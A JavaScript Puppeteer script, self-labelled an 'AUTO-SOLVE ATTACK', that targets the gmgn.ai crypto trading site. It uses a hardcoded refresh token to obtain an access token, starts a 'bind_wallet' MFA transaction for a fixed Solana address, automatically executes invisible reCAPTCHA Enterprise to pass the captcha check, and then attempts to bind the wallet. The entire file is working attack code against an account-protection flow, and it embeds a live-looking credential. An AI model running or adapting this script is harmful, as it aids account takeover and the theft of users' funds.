const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const FRESH_REFRESH = 'eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiJhMWQ2ZGZlNC1iODhmLTRjNTgtOThkYi00MmU0MmFhMjRmZDYiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxNS0yMTYxLTE4ZDViMTAiLCJkZXZpY2VfaWQiOiJkZTYyMGE1Ny1kOThlLTQyOTMtYjAwNy01ZDMxNTQ1NWUyMWQiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxNTMyNDdiOWUwZTE4NGZiZWQzZmFjNzNmMTlkY2E2OGEiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2NzQ0NDA3LCJpYXQiOjE3ODQxNTI0MDcsImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiMDYyNTVmMTAtNmVkZi00YmRiLWFiNjAtZGEzZDQwNmQ4YTgzIiwibmJmIjoxNzg0MTUyNDA3LCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiYTFkNmRmZTQtYjg4Zi00YzU4LTk4ZGItNDJlNDJhYTI0ZmQ2IiwidmVyIjoiMS4wIn0.uCsdhElzc2R3WZhvzcnHx3ZsvBRmzVA7dKT5J2fK92PDsg5troyv9_4ndY3yaLpgXwrEPsSyS66dsKrKebghmQ';
const PARAMS = 'device_id=de620a57-d98e-4293-b007-5d315455e21d&client_id=gmgn_web_20260715-2161-18d5b10&app_ver=20260715-2161-18d5b10&from_app=gmgn';
const TARGET = '5KCVo4xnj8n38FUyF2gFUzgJbDW9vV4C1bTpciznyciU';
const RECAPTCHA_SITEKEY = '6Lf3pucqAAAAADbq3czpqDHRAD8j3kC-hcwwDG_T';

(async () => {
    console.log('🔥 RECAPTCHA ENTERPRISE INVISIBLE — AUTO-SOLVE ATTACK');
    console.log('Sitekey:', RECAPTCHA_SITEKEY);
    
    const browser = await puppeteer.launch({
        headless: 'new',
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-web-security']
    });
    const page = await browser.newPage();
    await page.setViewport({width: 1920, height: 1080});
    
    // Load gmgn.ai (gets us valid session + loads reCAPTCHA)
    console.log('[1] Loading gmgn.ai...');
    await page.goto('https://gmgn.ai', {waitUntil: 'networkidle2', timeout: 25000});
    await new Promise(r => setTimeout(r, 3000));
    console.log('    Page loaded:', await page.title());
    
    // Execute the full attack in browser context
    console.log('[2] Executing attack...');
    
    const result = await page.evaluate(async (refresh, params, target, sitekey) => {
        const log = [];
        
        // Get token
        let r = await fetch('/account/account/refresh_access_token', {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({refresh_token: refresh})
        });
        let data = await r.json();
        if (data.code !== 0) return {error: 'token fail', data};
        const token = data.data.data.token;
        const h = {'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token};
        log.push('Token OK');
        
        // Generate bind_wallet txn_id
        r = await fetch('/account/account/generate_mfa_params?' + params, {
            method: 'POST', headers: h,
            body: JSON.stringify({usage: 'bind_wallet', biz_params: {address: target, wallet_type: 'sol', chain: 'sol'}})
        });
        data = await r.json();
        if (data.code !== 0) return {error: 'mfa fail', data};
        const txnId = data.data.data.txn_id;
        log.push('txn_id: ' + txnId);
        
        // Load reCAPTCHA Enterprise script
        log.push('Loading reCAPTCHA Enterprise...');
        
        await new Promise((resolve) => {
            if (window.grecaptcha && window.grecaptcha.enterprise) {
                resolve();
                return;
            }
            const script = document.createElement('script');
            script.src = 'https://www.recaptcha.net/recaptcha/enterprise.js?render=' + sitekey;
            script.onload = () => {
                // Wait for grecaptcha.enterprise.ready
                const check = setInterval(() => {
                    if (window.grecaptcha && window.grecaptcha.enterprise) {
                        clearInterval(check);
                        resolve();
                    }
                }, 100);
            };
            document.head.appendChild(script);
            setTimeout(resolve, 10000); // timeout
        });
        
        if (!window.grecaptcha || !window.grecaptcha.enterprise) {
            log.push('reCAPTCHA Enterprise NOT loaded');
            return {log, txnId};
        }
        
        log.push('reCAPTCHA Enterprise loaded!');
        
        // Execute invisible reCAPTCHA
        log.push('Executing invisible reCAPTCHA...');
        
        let captchaToken = null;
        try {
            captchaToken = await new Promise((resolve, reject) => {
                grecaptcha.enterprise.ready(async () => {
                    try {
                        const token = await grecaptcha.enterprise.execute(sitekey, {action: 'bind_wallet'});
                        resolve(token);
                    } catch(e) {
                        reject(e);
                    }
                });
                setTimeout(() => reject(new Error('timeout')), 15000);
            });
        } catch(e) {
            log.push('reCAPTCHA execute error: ' + e.message);
            return {log, txnId};
        }
        
        if (!captchaToken) {
            log.push('No captcha token obtained');
            return {log, txnId};
        }
        
        log.push('GOT RECAPTCHA TOKEN: ' + captchaToken.substring(0, 60) + '...');
        
        // Verify captcha with the token
        log.push('Verifying captcha...');
        
        const requestId = crypto.randomUUID();
        r = await fetch('/account/mfa/txn/v1/verify_captcha?' + params, {
            method: 'POST', headers: h,
            body: JSON.stringify({
                txn_id: txnId,
                usage: 'bind_wallet',
                captcha_data: captchaToken,
                request_id: requestId
            })
        });
        data = await r.json();
        log.push('verify_captcha: code=' + data.code + ' msg=' + (data.message || ''));
        
        if (data.code === 0) {
            log.push('CAPTCHA VERIFIED!!! Now trying bind...');
            
            // Try bind (still needs email OTP but let's see)
            r = await fetch('/account/bind_wallet?' + params, {
                method: 'POST', headers: h,
                body: JSON.stringify({address: target, wallet_type: 'sol', chain: 'sol', txn_id: txnId})
            });
            data = await r.json();
            log.push('bind_wallet: ' + JSON.stringify(data));
            
            return {log, captchaSolved: true, captchaToken: captchaToken.substring(0, 60), bindResult: data};
        }
        
        return {log, txnId, captchaToken: captchaToken.substring(0, 60), verifyResult: data};
    }, FRESH_REFRESH, PARAMS, TARGET, RECAPTCHA_SITEKEY);
    
    console.log('\n' + '='.repeat(80));
    console.log('RESULT:');
    console.log('='.repeat(80));
    console.log(JSON.stringify(result, null, 2));
    
    await browser.close();
})();
